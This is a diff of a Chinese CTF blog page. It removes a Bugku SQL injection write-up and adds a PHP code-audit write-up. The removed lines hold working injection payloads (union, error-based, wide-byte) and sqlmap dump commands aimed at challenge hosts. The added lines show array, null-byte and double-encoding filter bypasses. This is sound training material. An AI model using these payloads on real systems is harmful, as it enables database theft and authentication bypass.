@@ -20,27 +20,28 @@
     var CONFIG = {"hostname":"sunzhengyu99.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="Bugku刷题">
+  <meta name="description" content="简单的代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Bugku">
-<meta property="og:url" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/index.html">
+<meta property="og:title" content="bugku代码审计">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2020/09/14/decode/index.html">
 <meta property="og:site_name" content="一路走到黑">
-<meta property="og:description" content="Bugku刷题">
+<meta property="og:description" content="简单的代码审计">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd1.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd2.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd3.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd4.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd5.png">
-<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/k1.png">
-<meta property="article:published_time" content="2020-08-08T14:40:51.000Z">
-<meta property="article:modified_time" content="2020-09-10T08:43:42.471Z">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/14/decode/extrct.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/14/decode/file.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/14/decode/strcmp.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/14/decode/ereg.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/14/decode/strpos.png">
+<meta property="article:published_time" content="2020-09-14T13:01:01.000Z">
+<meta property="article:modified_time" content="2020-09-14T14:04:19.714Z">
 <meta property="article:author" content="sunzy">
-<meta property="article:tag" content="sql">
+<meta property="article:tag" content="变量覆盖">
+<meta property="article:tag" content="函数漏洞">
+<meta property="article:tag" content="绕过">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd1.png">
+<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/09/14/decode/extrct.png">
 
-<link rel="canonical" href="https://sunzhengyu99.github.io/2020/08/08/Bugku/">
+<link rel="canonical" href="https://sunzhengyu99.github.io/2020/09/14/decode/">
 
 
 <script id="page-configurations">
@@ -53,7 +54,7 @@
   };
 </script>
 
-  <title>Bugku | 一路走到黑</title>
+  <title>bugku代码审计 | 一路走到黑</title>
   
 
 
@@ -205,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sunzhengyu99.github.io/2020/08/08/Bugku/">
+    <link itemprop="mainEntityOfPage" href="https://sunzhengyu99.github.io/2020/09/14/decode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/my.png">
@@ -218,7 +219,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Bugku
+          bugku代码审计
         </h1>
 
         <div class="post-meta">
@@ -227,23 +228,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-08-08 22:40:51" itemprop="dateCreated datePublished" datetime="2020-08-08T22:40:51+08:00">2020-08-08</time>
+              <time title="创建时间：2020-09-14 21:01:01 / 修改时间：22:04:19" itemprop="dateCreated datePublished" datetime="2020-09-14T21:01:01+08:00">2020-09-14</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-10 16:43:42" itemprop="dateModified" datetime="2020-09-10T16:43:42+08:00">2020-09-10</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
                 </span>
             </span>
 
@@ -263,8 +258,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2020/08/08/Bugku/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/08/Bugku/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/09/14/decode/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/14/decode/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -274,7 +269,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.1k</span>
+              <span>2.6k</span>
             </span>
 
         </div>
@@ -286,75 +281,73 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><a id="more"></a>
+        <h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><a id="more"></a>
 
-<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' and 1=1 #      </span><br><span class="line">  </span><br><span class="line">1' and 1=2 #</span><br></pre></td></tr></table></figure>
-<p>   不显示内容，可以判断存在注入点</p>
-<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`
+<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;  <span class="comment">//新建变量</span></span><br><span class="line">extract($_GET);  <span class="comment">// 变量覆盖</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))   <span class="comment">//判断是否存在</span></span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));<span class="comment">//把文件读入字符串</span></span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)  <span class="comment">//判断两变量是否相等</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-  database:skctf_flag</code></pre><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p>
-<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
-<p> 得到flag</p>
-<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
-<p><img src="/2020/08/08/Bugku/cjd1.png" alt></p>
-<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre><p><img src="/2020/08/08/Bugku/cjd2.png" alt></p>
-<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre><p><img src="/2020/08/08/Bugku/cjd3.png" alt></p>
-<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre><p><img src="/2020/08/08/Bugku/cjd4.png" alt></p>
-<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre><p><img src="/2020/08/08/Bugku/cjd5.png" alt></p>
-<hr>
-<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>extract()函数</p>
+<p><img src="/2020/09/14/decode/extrct.png" alt></p>
+<p><strong>isset()函数</strong><br>isset() 函数用于检测变量是否已设置并且非 NULL。</p>
+<p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p>
+<p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p>
+<p>同时要注意的是 null 字符（”\0”）并不等同于 PHP 的 NULL 常量。</p>
+<p>Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。</p>
+<p>file_get_contents() </p>
+<p><img src="/2020/09/14/decode/file.png" alt></p>
+<p>变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值</p>
+<p>这里值得注意的是 <code>$shiyan</code>==<code>$content</code>,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同</p>
+<p>可以用空值的方法使二者想等即</p>
+<p><code>?shiyan=&amp;flag=</code></p>
+<h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目给的注释很清楚的给出了获得flag的条件。。。</p>
+<p>先了解一下</p>
+<p><img src="/2020/09/14/decode/strcmp.png" alt></p>
+<p>strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  即可获得flag</p>
+<p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p>
+<h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>题目说的很清楚了，二次编码绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">not allowed!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br></pre></td></tr></table></figure>
 
 
-<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
-<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
-<p> 2.利用==比较漏洞</p>
-<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
-<p> 下列的字符串的MD5值都是0e开头的：</p>
-<pre><code>QNKCDZO
 
-240610708
+<blockquote>
+<p>PHP 函数 eregi()</p>
+<p>语法<br> int eregi(string pattern, string string, [array regs]);<br> 定义和用法<br> eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。</p>
+<p>可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p>
+<p>返回值<br> 如果匹配成功返回true,否则,则返回false</p>
+</blockquote>
+<p>这里进行了过滤，传的值不能为hackerDJ</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>) <span class="comment">//要编码的字符串hackerDJ</span></span><br></pre></td></tr></table></figure>
 
-s878926199a
+<p>GET会提交时进行一次urlencode</p>
+<p>urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。</p>
+<p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecode后的<strong>$_GET[id]</strong> 复制给自己等于hackerDJ</p>
+<p>所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag</p>
+<p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
+<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p>之前写过</p>
+<h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) <span class="comment">//进行过滤，password必须包含字母和数字</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-s155964671a
+<p>提示是数组返回NULL</p>
+<p>直接尝试提交<code>?password[]=</code>，flag就出来了</p>
+<p>了解一下原理，</p>
+<blockquote>
+<p>代码相关知识点链接如下：</p>
+<p>isset函数：<a href="http://php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.isset.php</a></p>
+<p>ereg函数：<a href="http://www.php.net/manual/zh/function.ereg.php" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.ereg.php</a></p>
+<p>strpos函数：<a href="http://www.w3school.com.cn/php/func_string_strpos.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_strpos.asp</a></p>
+<p>“[A-Za-z0-9]”<br>方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符</p>
+<p>“^[A-Za-z0-9]$”<br>^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串</p>
+<p>“^[A-Za-z0-9]+$”<br>+号表示重复1到多次，匹配由多个数字大小字母组成的字符串</p>
+</blockquote>
+<p><img src="/2020/09/14/decode/ereg.png" alt="ereg"></p>
+<p><img src="/2020/09/14/decode/strpos.png" alt="strpos"></p>
+<p>值得注意的是这两个函数能处理的参数都是string类型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ereg只能处理字符，r如果数组，则返回的是<span class="keyword">null</span>，三个等号的时候不会进行类型转换。所以<span class="keyword">null</span>不等于<span class="keyword">false</span>。</span><br><span class="line"></span><br><span class="line">strpos的参数同样不能够是数组，所以返回的依旧是<span class="keyword">null</span>，<span class="keyword">null</span>不等于<span class="keyword">false</span>也是正确。</span><br></pre></td></tr></table></figure>
 
-s214587387a
-
-s214587387a</code></pre><hr>
-<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
-<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
-<p>database:<strong>web1002-1</strong></p>
-<p>爆表名</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre><p>flag1,hint</p>
-<p>爆字段名</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre><p>flag1,address<br>获取内容</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre><p><strong>usOwycTju+FTUUzXosjr</strong></p>
-<p>提交发现不对</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre><p>获取address中的内容</p>
-<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
-<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
-<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre><p>Unknown column ‘flag2’ in ‘where clause’</p>
-<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
-<p><strong>！！！注意把flag改为小写字母</strong></p>
-<hr>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
-<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre><p>加单引号报错</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre><p>查看所有的表</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre><p>查看表中的列</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
-ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
-<p>获取字段内容</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
-<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
-<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre><p>获取数据库名</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
- --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre><p>获取表名</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>获取flag</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>
+<p>故?password[]=可以绕过。</p>
+<p>但是还有一种为%00截断</p>
+<p><code>?password=d%00--</code></p>
 
     </div>
     <div>
@@ -375,7 +368,9 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/sql/" rel="tag"># sql</a>
+              <a href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="tag"># 变量覆盖</a>
+              <a href="/tags/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/" rel="tag"># 函数漏洞</a>
+              <a href="/tags/%E7%BB%95%E8%BF%87/" rel="tag"># 绕过</a>
           </div>
 
         
@@ -384,13 +379,10 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/07/18/%E6%9C%A8%E9%A9%AC/" rel="prev" title="木马">
-      <i class="fa fa-chevron-left"></i> 木马
+    <a href="/2020/09/10/bugku1/" rel="prev" title="bugku刷题记录2">
+      <i class="fa fa-chevron-left"></i> bugku刷题记录2
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/08/16/SSTI/" rel="next" title="SSTI">
-      SSTI <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -450,7 +442,7 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bugku刷题"><span class="nav-number">1.</span> <span class="nav-text">Bugku刷题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#成绩单"><span class="nav-number">1.1.</span> <span class="nav-text">成绩单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手工注入"><span class="nav-number">1.2.</span> <span class="nav-text">手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1&#39; order by 4#可正常显示可以判断存在四个字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-爆数据库"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.爆数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-爆出表名"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.爆出表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-字段名"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.字段名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-number">1.3.</span> <span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-获取数据库"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.获取数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-获取表名"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.获取表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 